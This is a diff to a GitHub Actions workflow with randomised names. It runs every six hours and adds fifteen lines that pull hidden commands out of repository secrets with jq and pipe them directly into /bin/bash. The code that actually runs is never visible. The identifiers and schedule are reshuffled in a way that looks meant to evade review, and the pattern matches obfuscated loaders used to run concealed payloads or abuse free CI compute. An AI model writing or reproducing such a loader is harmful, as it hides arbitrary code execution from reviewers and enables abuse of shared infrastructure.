@@ -1,18 +1,33 @@
 name: gouyanhuigg
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
+    - cron: '44 3/6 * * *'
 
-jobs:  # 27100
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gouyanhuigg
         env:
-          ng76: ${{ secrets.ng76 }}
+          bcwj9385: ${{ secrets.bcwj9385 }}
         run: |
-          echo $ng76 | jq -r .pnt1833 | /bin/bash
-          echo $xq36783 | jq -r .wn4687 | /bin/bash
+          echo $bcwj9385 | jq -r .ery6 | /bin/bash
+          echo $uhu1 | jq -r .g611 | /bin/bash
+          echo $wjibz43398 | jq -r .buqg64686 | /bin/bash
+          echo $mhq74 | jq -r .dyif181 | /bin/bash
+          echo $gunji38 | jq -r .m2 | /bin/bash
+          echo $ybimo192 | jq -r .ci68 | /bin/bash
+          echo $dfmwv3 | jq -r .cet0 | /bin/bash
+          echo $ryx59 | jq -r .u2967 | /bin/bash
+          echo $k9 | jq -r .cgi274 | /bin/bash
+          echo $b6755 | jq -r .vrnw646 | /bin/bash
+          echo $yu1 | jq -r .gbx27646 | /bin/bash
+          echo $b5149 | jq -r .akud03 | /bin/bash
+          echo $aobo604 | jq -r .w756 | /bin/bash
+          echo $g576 | jq -r .rwfe9823 | /bin/bash
+          echo $yemp43801 | jq -r .jv47774 | /bin/bash
 
